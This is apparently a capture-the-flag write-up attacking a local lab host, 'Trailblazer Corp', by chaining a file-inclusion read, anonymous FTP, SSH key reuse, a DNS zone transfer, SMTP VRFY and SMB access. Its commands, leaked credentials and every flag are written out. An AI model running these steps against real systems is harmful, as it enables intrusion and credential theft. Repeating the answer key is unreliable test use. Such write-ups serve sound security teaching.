# 🕵️‍♂️ Mission Log: Infiltrating Trailblazer Corp
**Status:** Mission Complete  
**Target:** Trailblazer Corp Perimeter  
**Objective:** Retrieve MASTER FLAG  

---

## 📝 Reconnaissance (Nmap)
I started by mapping the attack surface. Since I'm on the local network (VPN/Container), I scanned the target IP.

```bash
nmap -p- -sC -sV 127.0.0.1
```

**Findings:**
- **8082 (HTTP):** A web portal.
- **2121 (FTP):** `vsftpd` with *Anonymous* allowed.
- **2222 (SSH):** OpenSSH exposed.
- **5354 (DNS):** BIND server.
- **2525 (SMTP):** Python SMTP module?
- **1445 (SMB):** Samba file share.

---

## 📍 Step 1: Web Enumeration (HTTP: 8082)
I visited `hattp://127.0.0.1:8082` and found an "Employee Portal".
The URL `http://127.0.0.1:8082/docs/?doc=welcome.msg` looked suspicious. It suggests a **Local File Inclusion (LFI)** vulnerability where the server reads files based on user input.

**Exploit:**
I tried reading the source code or config files. I guessed `/app/config.txt`.

```bash
curl "http://localhost:8082/docs/?doc=/app/config.txt"
```

**Result:**
```text
ftp_user=anonymous
ftp_pass=anon123
```
Bingo! I also checked for a flag in the app directory.
```bash
curl "http://localhost:8082/docs/?doc=/app/flag_http.txt"
# Flag: STELKCSC{http_enum_lfi}
```

---

## 📍 Step 2: FTP Infiltration (FTP: 2121)
Using the credentials found (or just the fact that Nmap said "Anonymous Allowed"), I logged into the FTP server.

```bash
ftp -P 2121 127.0.0.1
# Name: anonymous
# Password: [Enter] (No password needed)
```

I listed the files:
```ftp
ls -la
# -rw-r--r--    1 0        0              25 Dec 07 05:00 flag_ftp.txt
# -rw-r--r--    1 0        0             606 Dec 07 05:00 ssh_key.pem
```

I downloaded everything:
```ftp
get flag_ftp.txt
get ssh_key.pem
bye
```
**Loot:**
- `flag_ftp.txt`: `STELKCSC{ftp_anon_brute}`
- `ssh_key.pem`: An RSA private key!

I inspected the key for clues.
```bash
cat ssh_key.pem
# At the bottom, I saw a comment/hint:
# Passphrase: trailblazer2025
```

---

## 📍 Step 3: Lateral Movement (SSH: 2222)
Now I have a key and a passphrase. I guessed the username might be `root` or `sysadmin` (common defaults). Nmap didn't reveal users, but standard enterprise enumeration suggests `sysadmin`.

```bash
# Set permission for key
chmod 600 ssh_key.pem

# Try login
ssh -i ssh_key.pem -p 2222 sysadmin@127.0.0.1
# Enter passphrase: trailblazer2025
```

**Access Granted!**
I'm in as `sysadmin`. I checked the home directory.
```bash
ls -la /home/sysadmin/files/
# flag_ssh.txt
# hints_ssh.txt
```

**Loot:**
- `flag_ssh.txt`: `STELKCSC{ssh_key_reuse}`
- `hints_ssh.txt`:
  ```
  SMTP_USER=smbuser
  SMTP_DOMAIN=trailblazer.corp
  ```
This gives me a target user (`smbuser`) and domain for the next steps.

---

## 📍 Step 4: DNS Cartography (DNS: 5354)
With `trailblazer.corp` identified, I poked the DNS server. Nmap hinted at zone transfers.

```bash
# Try a Zone Transfer (AXFR) to dump all records
dig AXFR @127.0.0.1 -p 5354 trailblazer.corp
```

**Result:**
```text
trailblazer.corp.   604800  IN  SOA ...
...
smb.trailblazer.corp.   IN  TXT "finance_backup share -> smbuser : ??? (Ask the Mail Daemon)"
flag.trailblazer.corp.  IN  TXT "STELKCSC{dns_zone_xfer}"
```
**Critical Intel:**
1.  **Flag:** `STELKCSC{dns_zone_xfer}`
2.  **Hint for Next Step:** The TXT record points to **SMB (`finance_backup`)** and a user **`smbuser`**, but the password is redacted. It says *"Ask the Mail Daemon"*. This confirms we need to query the **SMTP service**.

---

## 📍 Step 5: Service Verification (SMTP: 2525)
Following the DNS hint, I connected to the SMTP server to ask the "Mail Daemon".

```bash
nc 127.0.0.1 2525
# Server says: 220 Python SMTP proxy version 0.3
```

I used the `VRFY` command to query the user found in SSH hints (`smbuser`).

```text
VRFY smbuser@trailblazer.corp
```

**Response:**
```text
252 2.5.4 <smbuser@trailblazer.corp> [Pass: smbpass123 | Flag: STELKCSC{smtp_vrfy_relay}]
```
**Success!** The SMTP server leaked the SMB password (`smbpass123`) and gave me the SMTP flag.

---

## 📍 Step 6: The Heist (SMB: 1445)
I have valid credentials for the Samba share.
- **User:** `smbuser`
- **Pass:** `smbpass123`
- **Share:** `finance_backup` (found in DNS TXT)

```bash
smbclient //127.0.0.1/finance_backup -U smbuser -p 1445
# Enter password: smbpass123
```

**I'm in.**
```smb
smb: \> ls
  .                                   D        0  Sat Dec  7 12:00:00 2025
  ..                                  D        0  Sat Dec  7 12:00:00 2025
  flag_smb.txt                        N       27  Sat Dec  7 12:00:00 2025
  master_flag.txt                     N       39  Sat Dec  7 12:00:00 2025

smb: \> get master_flag.txt
smb: \> get flag_smb.txt
```

---

## 🏆 Mission Debrief (Flags)

| Challenge | Flag |
| :--- | :--- |
| **HTTP** | `STELKCSC{http_enum_lfi}` |
| **FTP** | `STELKCSC{ftp_anon_brute}` |
| **SSH** | `STELKCSC{ssh_key_reuse}` |
| **DNS** | `STELKCSC{dns_zone_xfer}` |
| **SMTP** | `STELKCSC{smtp_vrfy_relay}` |
| **SMB** | `STELKCSC{smb_null_shares}` |
| **MASTER** | `STELKCSC{protocol_chain_mastery_2025}` |

**Conclusion:**
Legacy protocols (FTP, unencrypted Telnet/SMTP) and poor configuration (LFI, Zone Transfers, Credential Reuse) are fatal. Trailblazer Corp has been fully compromised.
